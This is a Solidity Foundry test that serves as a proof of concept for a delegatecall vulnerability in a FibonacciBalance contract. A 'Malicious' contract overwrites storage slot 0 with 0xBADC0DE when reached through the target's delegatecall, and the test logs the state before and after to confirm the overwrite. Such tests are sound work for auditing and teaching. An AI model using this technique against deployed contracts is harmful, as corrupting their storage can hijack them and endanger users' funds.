// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/FibonacciBalance.sol";

contract Malicious {
    // Malicious payload writes 0xBAD to storage slot 0 when delegatecalled
    function attack() public {
        assembly {
            sstore(0, 0xBADC0DE)
        }
    }
}

contract FibonacciBalanceTest is Test {
    FibonacciBalance public fib;
    Malicious public attackerContract;
    
    function setUp() public {
        attackerContract = new Malicious();
        fib = new FibonacciBalance(address(attackerContract));
    }

    function testDelegatecallVulnerability() public {
        // Before trigger: get initial state
        bytes32 initialSlot = vm.load(address(fib), bytes32(uint256(0)));
        console2.log("--- BEFORE-Trigger State ---");
        console2.log("Initial storage slot value: %s", uint256(initialSlot));
        console2.log("Expected initial state: attacker contract address (%s)", address(attackerContract));

        // Trigger attack
        console2.log("--- Trigger Attack ---");
        (bool success,) = address(fib).call(
            abi.encodeWithSelector(Malicious.attack.selector)
        );
        require(success, "Delegatecall failed");
        console2.log("Attack executed via delegatecall");

        // After trigger: get post-attack state
        console2.log("--- AFTER-Trigger State ---");
        bytes32 newSlot = vm.load(address(fib), bytes32(uint256(0)));
        uint256 newValue = uint256(newSlot);
        console2.log("Post-attack storage slot value: %s", newValue);

        // Verify vulnerability by comparing states
        uint256 expectedAttackValue = 0xBADC0DE;
        bool vulnerable = (newValue == expectedAttackValue);
        
        // Differential verdict
        if (vulnerable) {
            console2.log("Vulnerability Exists: Storage slot overwritten with 0xBADC0DE");
        } else {
            console2.log("Vulnerability not Exist: Expected state change not detected");
        }
    }
}